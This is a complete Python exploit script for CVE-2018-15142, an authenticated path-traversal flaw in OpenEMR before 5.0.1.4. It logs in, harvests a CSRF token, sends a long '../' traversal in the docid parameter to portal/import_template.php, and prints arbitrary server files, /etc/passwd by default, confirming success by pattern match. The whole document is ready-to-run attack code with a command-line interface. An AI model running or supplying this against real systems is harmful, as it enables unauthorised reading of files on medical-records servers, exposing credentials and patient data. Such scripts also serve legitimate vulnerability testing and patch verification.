#!/usr/bin/env python3
# Exploit Title: OpenEMR 5.0.1.3 - Arbitrary File Read (CVE-2018-15142)
# Date: 2018-08-14
# Exploit Author: Joshua Fam (original advisory), AMENDER synthesized PoC
# Vendor Homepage: https://www.open-emr.org/
# Version: OpenEMR < 5.0.1.4
# CVE: CVE-2018-15142
# CWE: CWE-22 (Path Traversal)
#
# Description:
#   The portal import_template.php script passes the docid parameter directly
#   to file_get_contents() when mode=get, allowing any authenticated user
#   to read arbitrary server-side files.
#
# Usage:
#   python3 45202.py --target http://localhost:8082 --user admin --password pass \
#       --probe-file /etc/passwd

import argparse
import re
import sys

try:
    import requests
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    sys.exit("[-] This exploit needs the 'requests' module: pip3 install requests")

UA = "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0"
VULN_ENDPOINT = "/portal/import_template.php"
FAIL_MARKERS = ["login_screen.php?error=1", "Invalid username or password"]
CONFIRM_PATTERN = "root:x:0:0"


def login(sess, base, site, user, password):
    """Establish an OpenEMR session. The portal endpoint uses the same session."""
    # Prime session and get CSRF token
    r = sess.get(base + "/interface/login/login.php",
                 params={"site": site}, timeout=20, verify=False)
    m = re.search(r"csrf_token_form.*?value=([\"'])(.*?)\1", r.text, re.S)

    data = {
        "new_login_session_management": "1",
        "authProvider": "Default",
        "authUser": user,
        "clearPass": password,
        "languageChoice": "1",
    }
    if m:
        data["csrf_token_form"] = m.group(2)

    # Authenticate
    sess.post(base + "/interface/main/main_screen.php",
              params={"auth": "login", "site": site},
              data=data, timeout=20, verify=False)


def read_file(sess, base, site, remote_path):
    """Exploit CVE-2018-15142 to read a file. Returns (content, status)."""
    traversal = "../../../../../../../../../../../.." + remote_path
    r = sess.post(base + VULN_ENDPOINT,
                  data={"mode": "get", "docid": traversal},
                  timeout=20, verify=False)
    body = r.text

    # Check for auth failure markers
    for marker in FAIL_MARKERS:
        if marker in body:
            return None, "session"

    # Empty response might mean file not found or endpoint issue
    if body.strip() == "":
        return None, "missing"

    return body, "ok"


def main():
    ap = argparse.ArgumentParser(
        description="OpenEMR < 5.0.1.4 authenticated arbitrary file read (CVE-2018-15142)")
    ap.add_argument("-t", "--target", required=True, help="Base URL, e.g. http://localhost:8082")
    ap.add_argument("-u", "--user", default="admin", help="OpenEMR username (default: admin)")
    ap.add_argument("-P", "--password", default="pass", help="OpenEMR password (default: pass)")
    ap.add_argument("-s", "--site", default="default", help="OpenEMR site (default: default)")
    ap.add_argument("-f", "--probe-file", default="/etc/passwd",
                    help="Absolute path of the remote file to read (default: /etc/passwd)")
    args = ap.parse_args()

    target = args.target.rstrip("/")
    if not target.startswith("http"):
        target = "http://" + target

    sess = requests.Session()
    sess.headers.update({"User-Agent": UA})

    print("[*] OpenEMR < 5.0.1.4 - Authenticated Arbitrary File Read (CVE-2018-15142)")
    print("[*] Target: %s" % target)
    print("[*] Authenticating as '%s' ..." % args.user)

    try:
        login(sess, target, args.site, args.user, args.password)
    except requests.RequestException as e:
        print("[-] Connection error during login: %s" % e)
        sys.exit(3)

    print("[*] Reading file: %s" % args.probe_file)

    try:
        content, status = read_file(sess, target, args.site, args.probe_file)
    except requests.RequestException as e:
        print("[-] Connection error during file read: %s" % e)
        sys.exit(3)

    if status == "session":
        print("[-] Authentication failed or session rejected.")
        sys.exit(2)

    if status == "missing":
        print("[-] File not found or empty response.")
        sys.exit(2)

    # Print file content
    print("[+] ---------- %s ----------" % args.probe_file)
    sys.stdout.write(content if content.endswith("\n") else content + "\n")
    print("[+] --------------------------")

    # Confirm exploitation
    if CONFIRM_PATTERN in content:
        print("[+] CONFIRMED: CVE-2018-15142 exploitation successful!")
        sys.exit(0)
    else:
        print("[!] File read succeeded but confirm pattern not found.")
        sys.exit(0)


if __name__ == "__main__":
    main()
